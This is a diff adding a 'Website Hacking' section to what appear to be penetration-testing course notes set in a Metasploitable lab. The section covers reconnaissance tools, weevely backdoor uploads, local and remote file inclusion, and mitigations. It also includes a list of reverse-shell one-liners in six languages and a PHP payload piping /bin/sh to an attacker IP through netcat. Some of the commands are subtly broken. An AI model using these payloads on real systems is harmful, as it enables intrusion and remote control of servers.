@@ -1247,3 +1247,162 @@ migrate explorer_process_id
     - set PAYLOAD cmd/unix/bind_netcat
     - exploit
   ```
+
+# Website Hacking
+
+- Website has:
+- Computer with OS and some servers.
+- Apache, MySQL ...etc
+- Contains web application.
+- PHP, Python ...etc
+- Web application is executed here (at server) and not on the client’s machine
+- **How to hack a Website?**
+- An application installed on a computer . → web application pentesting
+- Computer uses an OS + other applications → server side attacks.
+- Managed by humans → client side attacks. (get credentials of user who manage website)
+- use metasploitable for testing
+- download page: <https://information.rapid7.com/download-metasploitable-download.html>
+- toggle security > set to low, for testing
+
+## Website Hacking : Information Gathering
+
+- IP address (maltigo, zenmap etc)
+- Domain name info
+- Technologies used.
+- Other websites on the same server.
+- DNS records.
+- Unlisted files, sub-domains, directories
+
+1. Whois Lookup - Find info about the owner of the target
+→ <http://whois.domaintools.com/>
+2. Netcraft Site Report - Shows technologies used on the target.
+→ <http://toolbar.netcraft.com/site_report?url>=
+3. Robtex DNS lookup - Shows comprehensive info about the target website.
+→ <https://www.robtex.com/>
+
+- <https://www.exploit-db.com/> : check exploits on used version of applications
+
+### Websites on the same server
+
+- One server can serve a number of websites.
+- Gaining access to one can help gaining access to others.
+- To find websites on the same server:
+  1. Use Robtex DNS lookup under “names pointing to same IP”.
+  2. Using bing.com, search for ip: [target ip]
+
+### Subdomains
+
+- Subdomain.target.com
+- Ex: beta.facebook.com
+- Knock can be used to find subdomains of target
+  1. Download it > git clone <https://github.com/guelfoweb/knock.git>
+  2. Navigate to knock.py. > ce knock/knock.py
+  3. Run it > python knock.py [target]
+
+### Files + Directories
+
+- Find files & directories in target website
+- A tool called drib.
+   > dirb [target] [wordlist] [options]
+- if no wordlist given, default will be used
+- For more info run
+  > man dirb
+- use application Mutilidae inside metasploitable for testing
+- robots.txt -> files hidden from search engine
+
+## Website Hacking : File Upload Vulns
+
+- Simples type of vulnerabilities.
+- Allow users to upload executable files such as php.
+- Upload a php shell or backdoor, ex: weevly
+  1. Generate backdoor > weevly generate [passord] [file name]
+  2. Upload generated file.
+  3. Connect to it > weevly [url to file] [password]
+  4. Find out how to use weevly > help
+
+## Website Hacking : Code Execution Vulns
+
+- Allows an attacker to execute OS commands.
+- Windows or linux commands.
+- Can be used to get a reverse shell.
+- Or upload any file using wget command.
+- Code execution commands attached in the repository : code-execution-reverse-shell-commands.txt
+
+```txt
+The following examples assums the hacker IP is 10.20.14 and use port 8080 for the connection.
+Therefore in all of these cases you need to listen for port 8080 using the following command
+nc -vv -l -p 8080
+
+
+BASH
+bash -i >& /dev/tcp/10.20.14.203/8080 0>&1
+
+PERL
+perl -e 'use Socket;$i="10.20.14";$p=8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+
+Python
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.20.14",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+PHP
+php -r '$sock=fsockopen("10.20.14",8080);exec("/bin/sh -i <&3 >&3 2>&3");'
+
+Ruby
+ruby -rsocket -e'f=TCPSocket.open("10.20.14",8080).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
+
+Netcat
+nc -e /bin/sh 10.20.14 8080
+```
+
+## Local File Inclusion
+
+- Allows an attacker read ANY file on the same server.
+- Access files outside www directory.
+- ex:
+  - <http://target_ip_address:/dv/vuln/?page=include.php>
+  - it is similar to : <http://target_ip_address:/dv/vuln/?page=var/www/dv/vuln/include.php>
+  - change it to : <http://target_ip_address:/dv/vuln/?page=../../../../etc/file_outside_of_var_www.txt>
+  - it will read file outside of var/www
+
+## Remote File Inclusion
+
+- Similar to local file inclusion.
+- But allows an attacker read ANY file from ANY server.
+- Execute php files from other servers on the current server.
+- possible if server implements:
+  - in php settings : /etc/php5/cgi/php.ini
+    - allow_url_fopen = On
+    - allow_url_include = On
+  - restart apache server : /etc/init.d/apache2 restart
+  - it allow local file inclusion to remote file inclusion
+- file need to uploaded should be available on public url to upload
+- Store php files with below content on other servers (hacker machine) as .txt (lets say reverse.txt) inside var/www folder to accessable with ip address
+
+```php
+  <?php
+  passthru(nc -e /bin/sh 10.20.14 8080)
+  >
+```
+
+- start listening for connections using netcat
+  > nc -vv -l -p 8080
+- ex:
+  - <http://target_ip_address:/dv/vuln/?page=include.php>
+  - it is similar to : <http://target_ip_address:/dv/vuln/?page=var/www/dv/vuln/include.php>
+  - change it to : <http://target_ip_address:/dv/vuln/?page=http://your_machine_ip/reverse.txt>
+  - it will read reverse.txt file from var/www on your machine
+  - add ? at last to execute reverse.txt as php
+    - ex: <http://target_ip_address:/dv/vuln/?page=http://your_machine_ip/reverse.txt?>
+- Note: if we save as .php, it will execute on hacker machine not on target machine
+
+## Website Hacking : Mitigation
+
+- File Upload Vulns - Only allow safe files to be uploaded.
+- Code Execution Vulns:
+  - Don’t use dangerous functions.
+  - Filter use input before execution. (file type, not just extension)
+  - regex to commands executions (avoid command execusion at all cost)
+- File inclusion:
+  - Disable allow_url_fopen & allow_url_include.
+  - Use static file inclusion.
+
+## Exploitation - SQL Injection
